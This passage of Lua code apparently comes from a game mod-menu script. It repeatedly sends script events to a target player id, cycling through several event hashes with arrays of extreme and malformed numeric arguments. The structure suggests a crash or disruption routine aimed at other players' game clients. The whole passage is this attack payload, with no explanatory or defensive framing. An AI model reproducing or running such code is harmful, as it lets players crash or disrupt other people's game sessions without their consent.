                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1252906024, pid, {-1, 0})
        send_script_event(-1252906024, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1252906024,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1252906024, pid, {-1, 0})
        send_script_event(-1252906024, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1252906024,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1252906024, pid, {1, 0})
        send_script_event(-1252906024, pid, {0, -1})
        send_script_event(
            -1252906024,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(
            -1252906024,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                pid,
                -10,
                pid
            }
        )
        send_script_event(-1252906024, pid, {pid, 23048976 + 1 + pid * 595 + 506})
        send_script_event(-1252906024, pid, {pid, 23048976 + 1 + pid * 695 + 507})
        send_script_event(-1252906024, pid, {pid, 1630317 + 1 + pid * 989 + 555})
        send_script_event(-1252906024, pid, {0, 0, 46190868, 0, 2})
        send_script_event(-1252906024, pid, {46190868, 0, 46190868, 46190868, 2})
        send_script_event(-1252906024, pid, {1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-1252906024, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-1252906024, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(-1252906024, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-1252906024, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1252906024, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1252906024, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-1252906024, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-1252906024, pid, {-1139568479, -1, 1, 100099})
        send_script_event(
            -1252906024,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            -1252906024,
            pid,
            {
                -1,
                -1,
                -1,
                -1,
                -1139568479,
                -1,
                1,
                100099,
                -1,
                500000,
                849451549,
                -1,
                -1,
                91645,
                -99683,
                1788,
                60877,
                55085,
                72028
            }
        )
        send_script_event(
            -1252906024,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(-1890951223, pid, {pid, 532165, pid})
        send_script_event(-1890951223, pid, {pid, 532165})
        send_script_event(-1890951223, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1890951223,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1890951223, pid, {-1, 0})
        send_script_event(
            -1890951223,
            pid,
            {pid, -1726396442, 428882541, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10}
        )
        send_script_event(-1890951223, pid, {pid, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10})
        send_script_event(-1890951223, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1890951223,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1890951223, pid, {-1, 0})
        send_script_event(-1890951223, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1890951223,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1890951223, pid, {-1, 0})
        send_script_event(-1890951223, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1890951223,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1890951223, pid, {-1, 0})
        send_script_event(-1890951223, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1890951223, pid, {pid, -13, -12, -11, -10, 19, pid, 10, 10, 10, 10, -1, -11, -19, -506, 506})
        send_script_event(-1890951223, pid, {pid, 532165, pid})
        send_script_event(-1890951223, pid, {pid, 532165, pid})
        send_script_event(-1890951223, pid, {pid, 532165, pid})
        send_script_event(-1890951223, pid, {1, 0})
        send_script_event(-1890951223, pid, {0, -1})
        send_script_event(
            -1890951223,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(
            -1890951223,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                pid,
                -10,
                pid
            }
        )
        send_script_event(-1890951223, pid, {pid, 23048976 + 1 + pid * 595 + 506})
        send_script_event(-1890951223, pid, {pid, 23048976 + 1 + pid * 695 + 507})
        send_script_event(-1890951223, pid, {pid, 1630317 + 1 + pid * 989 + 555})
        send_script_event(-1890951223, pid, {0, 0, 46190868, 0, 2})
        send_script_event(-1890951223, pid, {46190868, 0, 46190868, 46190868, 2})
        send_script_event(-1890951223, pid, {1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-1890951223, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-1890951223, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(-1890951223, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-1890951223, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1890951223, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1890951223, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-1890951223, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-1890951223, pid, {-1139568479, -1, 1, 100099})
        send_script_event(
            -1890951223,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            -1890951223,
            pid,
            {
                -1,
                -1,
                -1,
                -1,
                -1139568479,
                -1,
                1,
                100099,
                -1,
                500000,
                849451549,
                -1,
                -1,
                91645,
                -99683,
                1788,
                60877,
                55085,
                72028
            }
        )
        send_script_event(
            -1890951223,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(-1559754940, pid, {pid, 532165, pid})
        send_script_event(-1559754940, pid, {pid, 532165})
        send_script_event(-1559754940, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1559754940,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1559754940, pid, {-1, 0})
        send_script_event(
            -1559754940,
            pid,
            {pid, -1726396442, 428882541, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10}
        )
        send_script_event(-1559754940, pid, {pid, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10})
        send_script_event(-1559754940, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1559754940,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1559754940, pid, {-1, 0})
        send_script_event(-1559754940, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1559754940,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1559754940, pid, {-1, 0})
        send_script_event(-1559754940, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1559754940,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1559754940, pid, {-1, 0})
        send_script_event(-1559754940, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1559754940, pid, {pid, -13, -12, -11, -10, 19, pid, 10, 10, 10, 10, -1, -11, -19, -506, 506})
        send_script_event(-1559754940, pid, {pid, 532165, pid})
        send_script_event(-1559754940, pid, {pid, 532165, pid})
        send_script_event(-1559754940, pid, {pid, 532165, pid})
        send_script_event(-1559754940, pid, {1, 0})
        send_script_event(-1559754940, pid, {0, -1})
        send_script_event(
            -1559754940,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(
            -1559754940,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                pid,
                -10,
                pid
            }
        )
        send_script_event(-1559754940, pid, {pid, 23048976 + 1 + pid * 595 + 506})
        send_script_event(-1559754940, pid, {pid, 23048976 + 1 + pid * 695 + 507})
        send_script_event(-1559754940, pid, {pid, 1630317 + 1 + pid * 989 + 555})
        send_script_event(-1559754940, pid, {0, 0, 46190868, 0, 2})
        send_script_event(-1559754940, pid, {46190868, 0, 46190868, 46190868, 2})
        send_script_event(-1559754940, pid, {1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-1559754940, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-1559754940, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(-1559754940, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-1559754940, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1559754940, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1559754940, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-1559754940, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-1559754940, pid, {-1139568479, -1, 1, 100099})
        send_script_event(
            -1559754940,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            -1559754940,
            pid,
            {
                -1,
                -1,
                -1,
                -1,
                -1139568479,
                -1,
                1,
                100099,
                -1,
                500000,
                849451549,
                -1,
                -1,
                91645,
                -99683,
                1788,
                60877,
                55085,
                72028
            }
        )
        send_script_event(
            -1559754940,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(-1054826273, pid, {pid, 532165, pid})
        send_script_event(-1054826273, pid, {pid, 532165})
        send_script_event(-1054826273, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1054826273,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1054826273, pid, {-1, 0})
        send_script_event(
            -1054826273,
            pid,
            {pid, -1726396442, 428882541, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10}
        )
        send_script_event(-1054826273, pid, {pid, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10})
        send_script_event(-1054826273, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1054826273,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1054826273, pid, {-1, 0})
        send_script_event(-1054826273, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1054826273,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1054826273, pid, {-1, 0})
        send_script_event(-1054826273, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1054826273,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1054826273, pid, {-1, 0})
        send_script_event(-1054826273, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1054826273, pid, {pid, -13, -12, -11, -10, 19, pid, 10, 10, 10, 10, -1, -11, -19, -506, 506})
        send_script_event(-1054826273, pid, {pid, 532165, pid})
        send_script_event(-1054826273, pid, {pid, 532165, pid})
        send_script_event(-1054826273, pid, {pid, 532165, pid})
        util.yield(1)
        send_script_event(-1054826273, pid, {1, 0})
        send_script_event(-1054826273, pid, {0, -1})
        send_script_event(
            -1054826273,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(
            -1054826273,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                pid,
                -10,
                pid
            }
        )
        send_script_event(-1054826273, pid, {pid, 23048976 + 1 + pid * 595 + 506})
        send_script_event(-1054826273, pid, {pid, 23048976 + 1 + pid * 695 + 507})
        send_script_event(-1054826273, pid, {pid, 1630317 + 1 + pid * 989 + 555})
        send_script_event(-1054826273, pid, {0, 0, 46190868, 0, 2})
        send_script_event(-1054826273, pid, {46190868, 0, 46190868, 46190868, 2})
        send_script_event(-1054826273, pid, {1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-1054826273, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-1054826273, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(-1054826273, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-1054826273, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1054826273, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1054826273, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-1054826273, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-1054826273, pid, {-1139568479, -1, 1, 100099})
        send_script_event(
            -1054826273,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            -1054826273,
            pid,
            {
                -1,
                -1,
                -1,
                -1,
                -1139568479,
                -1,
                1,
                100099,
                -1,
                500000,
                849451549,
                -1,
                -1,
                91645,
                -99683,
                1788,
                60877,
                55085,
                72028
            }
        )
        send_script_event(
            -1054826273,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(1620254541, pid, {pid, 532165, pid})
        send_script_event(1620254541, pid, {pid, 532165})
        send_script_event(1620254541, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            1620254541,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(1620254541, pid, {-1, 0})
        send_script_event(
            1620254541,
            pid,
            {pid, -1726396442, 428882541, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10}
        )
        send_script_event(1620254541, pid, {pid, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10})
        send_script_event(1620254541, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            1620254541,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(1620254541, pid, {-1, 0})
        send_script_event(1620254541, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            1620254541,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(1620254541, pid, {-1, 0})
        send_script_event(1620254541, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            1620254541,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(1620254541, pid, {-1, 0})
        send_script_event(1620254541, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1620254541, pid, {pid, -13, -12, -11, -10, 19, pid, 10, 10, 10, 10, -1, -11, -19, -506, 506})
        send_script_event(1620254541, pid, {pid, 532165, pid})
        send_script_event(1620254541, pid, {pid, 532165, pid})
        send_script_event(1620254541, pid, {pid, 532165, pid})
        send_script_event(1620254541, pid, {1, 0})
        send_script_event(1620254541, pid, {0, -1})
        send_script_event(
            1620254541,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(
            1620254541,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                pid,
                -10,
                pid
            }
        )
        send_script_event(1620254541, pid, {pid, 23048976 + 1 + pid * 595 + 506})
        send_script_event(1620254541, pid, {pid, 23048976 + 1 + pid * 695 + 507})
        send_script_event(1620254541, pid, {pid, 1630317 + 1 + pid * 989 + 555})
        send_script_event(1620254541, pid, {0, 0, 46190868, 0, 2})
        send_script_event(1620254541, pid, {46190868, 0, 46190868, 46190868, 2})
        send_script_event(1620254541, pid, {1337, -1, 1, 1, 0, 0, 0})
        send_script_event(1620254541, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
        send_script_event(1620254541, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(1620254541, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(1620254541, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1620254541, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1620254541, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(1620254541, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(1620254541, pid, {-1139568479, -1, 1, 100099})
        send_script_event(
            1620254541,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            1620254541,
            pid,
            {
                -1,
                -1,
                -1,
                -1,
                -1139568479,
                -1,
                1,
                100099,
                -1,
                500000,
                849451549,
                -1,
                -1,
                91645,
                -99683,
                1788,
                60877,
                55085,
                72028
            }
        )
        send_script_event(
            1620254541,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(1401831542, pid, {pid, 532165, pid})
        send_script_event(1401831542, pid, {pid, 532165})
        send_script_event(1401831542, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            1401831542,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(1401831542, pid, {-1, 0})
        send_script_event(
            1401831542,
            pid,
            {pid, -1726396442, 428882541, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10}
        )
        send_script_event(1401831542, pid, {pid, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10})
        send_script_event(1401831542, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            1401831542,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(1401831542, pid, {-1, 0})
        send_script_event(1401831542, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            1401831542,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(1401831542, pid, {-1, 0})
        send_script_event(1401831542, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            1401831542,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(1401831542, pid, {-1, 0})
        send_script_event(1401831542, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1401831542, pid, {pid, -13, -12, -11, -10, 19, pid, 10, 10, 10, 10, -1, -11, -19, -506, 506})
        send_script_event(1401831542, pid, {pid, 532165, pid})
        send_script_event(1401831542, pid, {pid, 532165, pid})
        send_script_event(1401831542, pid, {pid, 532165, pid})
        send_script_event(1401831542, pid, {1, 0})
        send_script_event(1401831542, pid, {0, -1})
        send_script_event(
            1401831542,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(
            1401831542,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                pid,
                -10,
                pid
            }
        )
        send_script_event(1401831542, pid, {pid, 23048976 + 1 + pid * 595 + 506})
        send_script_event(1401831542, pid, {pid, 23048976 + 1 + pid * 695 + 507})
        send_script_event(1401831542, pid, {pid, 1630317 + 1 + pid * 989 + 555})
        send_script_event(1401831542, pid, {0, 0, 46190868, 0, 2})
        send_script_event(1401831542, pid, {46190868, 0, 46190868, 46190868, 2})
        send_script_event(1401831542, pid, {1337, -1, 1, 1, 0, 0, 0})
        send_script_event(1401831542, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
        send_script_event(1401831542, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(1401831542, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(1401831542, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1401831542, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1401831542, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(1401831542, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(1401831542, pid, {-1139568479, -1, 1, 100099})
        send_script_event(
            1401831542,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            1401831542,
            pid,
            {
                -1,
                -1,
                -1,
                -1,
                -1139568479,
                -1,
                1,
                100099,
                -1,
                500000,
                849451549,
                -1,
                -1,
                91645,
                -99683,
                1788,
                60877,
                55085,
                72028
            }
        )
        send_script_event(
            1401831542,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(-1491386500, pid, {pid, 532165, pid})
        send_script_event(-1491386500, pid, {pid, 532165})
        send_script_event(-1491386500, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1491386500,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1491386500, pid, {-1, 0})
        send_script_event(
            -1491386500,
            pid,
            {pid, -1726396442, 428882541, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10}
        )
        send_script_event(-1491386500, pid, {pid, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10})
        send_script_event(-1491386500, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1491386500,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1491386500, pid, {-1, 0})
        send_script_event(-1491386500, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1491386500,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1491386500, pid, {-1, 0})
        send_script_event(-1491386500, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1491386500,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1491386500, pid, {-1, 0})
        send_script_event(-1491386500, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1491386500, pid, {pid, -13, -12, -11, -10, 19, pid, 10, 10, 10, 10, -1, -11, -19, -506, 506})
        send_script_event(-1491386500, pid, {pid, 532165, pid})
        send_script_event(-1491386500, pid, {pid, 532165, pid})
        send_script_event(-1491386500, pid, {pid, 532165, pid})
        send_script_event(-1491386500, pid, {1, 0})
        send_script_event(-1491386500, pid, {0, -1})
        send_script_event(
            -1491386500,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
